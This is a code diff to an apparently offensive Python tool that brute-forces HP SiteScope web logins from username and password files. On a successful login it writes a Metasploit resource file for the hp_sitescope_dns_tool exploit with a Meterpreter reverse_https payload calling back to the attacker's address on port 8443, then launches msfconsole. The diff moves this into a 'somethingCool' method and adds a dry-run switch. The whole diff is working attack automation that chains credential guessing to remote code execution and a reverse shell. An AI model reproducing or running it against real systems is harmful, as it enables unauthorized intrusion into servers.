@@ -14,6 +14,28 @@ class SiteScopeBrute(webModule):
         super(SiteScopeBrute, self).__init__(config, display, lock)
         self.fingerprint="SiteScope"
         self.response="Success"
+    def somethingCool(self, config):
+        host = config["HOST"].split(":")[1]
+        host = host.split("/")[2]
+        port = config["HOST"].split(":")[2]
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect((host,int(port)))
+        locIP = s.getsockname()[0]
+        s.close()
+        msfrf = open('msfresource.rc', 'w')
+        msfrf.write('use exploit/windows/http/hp_sitescope_dns_tool\n')
+        msfrf.write('set PAYLOAD windows/meterpreter/reverse_https\n')
+        msfrf.write('set RHOST ' + host + '\n')
+        msfrf.write('set RPORT ' + port + '\n')
+        msfrf.write('set SITE_SCOPE_USER ' + config["USERNAME"] + '\n')
+        msfrf.write('set SITE_SCOPE_PASSWORD ' + config["PASSWORD"] + '\n')
+        msfrf.write('set LHOST ' + locIP + '\n')
+        msfrf.write('set LPORT 8443\n')
+        msfrf.write('set ExitOnSession false\n')
+        msfrf.write('exploit\n')
+        msfrf.close()
+        os.system("msfconsole -r msfresource.rc")
+        os.system("rm msfresource.rc")
     def connectTest(self, config, payload):
         with session() as c:
             requests.packages.urllib3.disable_warnings()
@@ -27,30 +49,32 @@ class SiteScopeBrute(webModule):
             if m:
                 print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
             else:
-                print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"] + ". Running Metasploit module now...")
-                host = config["HOST"].split(":")[1]
-                host = host.split("/")[2]
-                port = config["HOST"].split(":")[2]
-                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                s.connect((host,int(port)))
-                locIP = s.getsockname()[0]
-                s.close()
-                msfrf = open('msfresource.rc', 'w')
-                msfrf.write('use exploit/windows/http/hp_sitescope_dns_tool\n')
-                msfrf.write('set PAYLOAD windows/meterpreter/reverse_https\n')
-                msfrf.write('set RHOST ' + host + '\n')
-                msfrf.write('set RPORT ' + port + '\n')
-                msfrf.write('set SITE_SCOPE_USER ' + config["USERNAME"] + '\n')
-                msfrf.write('set SITE_SCOPE_PASSWORD ' + config["PASSWORD"] + '\n')
-                msfrf.write('set LHOST ' + locIP + '\n')
-                msfrf.write('set LPORT 8443\n')
-                msfrf.write('set ExitOnSession false\n')
-                msfrf.write('exploit\n')
-                msfrf.close()
-                os.system("msfconsole -r msfresource.rc")
-                os.system("rm msfresource.rc")
+                print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
+                if not config["dry_run"]:
+                    print("[!] Time to do something cool!")
+                    self.somethingCool(config)
     def payload(self, config):
-        if config["UserFile"]:
+        if config["PASS_FILE"]:
+            pass_lines = [pass_line.rstrip('\n') for pass_line in open(config["PASS_FILE"])]
+            for pass_line in pass_lines:
+                if config["UserFile"]:
+                    lines = [line.rstrip('\n') for line in open(config["UserFile"])]
+                    for line in lines:
+                        config["USERNAME"] = line.strip('\n')
+                        config["PASSWORD"] = pass_line.strip('\n')
+                        payload = {
+                            'j_username': config["USERNAME"],
+                            'j_password': config["PASSWORD"]
+                            }
+                        self.connectTest(config, payload)
+                else:
+                    config["PASSWORD"] = pass_line.strip('\n')
+                    payload = {
+                        'j_username': config["USERNAME"],
+                        'j_password': config["PASSWORD"]
+                        }
+                    self.connectTest(config, payload)
+        elif config["UserFile"]:
             lines = [line.rstrip('\n') for line in open(config["UserFile"])]
             for line in lines:
                 config["USERNAME"] = line.strip('\n')
